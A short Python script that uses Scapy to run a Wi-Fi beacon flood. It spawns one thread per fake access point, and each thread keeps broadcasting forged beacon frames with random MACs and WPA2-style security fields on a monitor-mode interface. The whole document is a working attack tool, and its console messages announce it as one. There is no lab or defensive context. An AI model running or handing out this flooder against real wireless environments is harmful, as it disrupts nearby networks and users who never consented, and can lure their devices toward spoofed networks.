from scapy.all import *
import random
import time
import threading

iface = "wlan0"  # Wireless interface in monitor mode

def generate_ssid(index, base_name=None):
    if base_name:
        return f"{base_name}_{index}"
    else:
        return f"Fake_AP_{index}_{random.randint(1000,9999)}"

def send_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                  addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'              # RSN Version 1
        '\x00\x0f\xac\x02'      # Group Cipher Suite : TKIP
        '\x02\x00'              # Pairwise Cipher Suite Count
        '\x00\x0f\xac\x04'      # Pairwise Cipher Suite List : AES
        '\x00\x0f\xac\x02'
        '\x01\x00'              # Auth Key Management Suite Count
        '\x00\x0f\xac\x02'      # PSK
        '\x00\x00'))            # RSN Capabilities

    frame = RadioTap() / dot11 / beacon / essid / rsn

    while True:
        sendp(frame, iface=iface, verbose=0)
        time.sleep(0.1)

def start_attack(ap_count, base_name=None):
    for i in range(ap_count):
        ssid = generate_ssid(i+1, base_name)
        mac = RandMAC()
        thread = threading.Thread(target=send_beacon, args=(ssid, mac))
        thread.daemon = True  # Allows threads to close when you CTRL+C
        thread.start()
        print(f"[+] Broadcasting fake AP: {ssid} ({mac})")

if __name__ == "__main__":
    try:
        count = int(input("Enter number of fake APs to create: "))
        base_name = input("Enter base name for APs (leave blank for default random names): ").strip()
        if base_name == "":
            base_name = None
        start_attack(count, base_name)
        print("[*] Attack running... Press CTRL+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Beacon Flood stopped.")
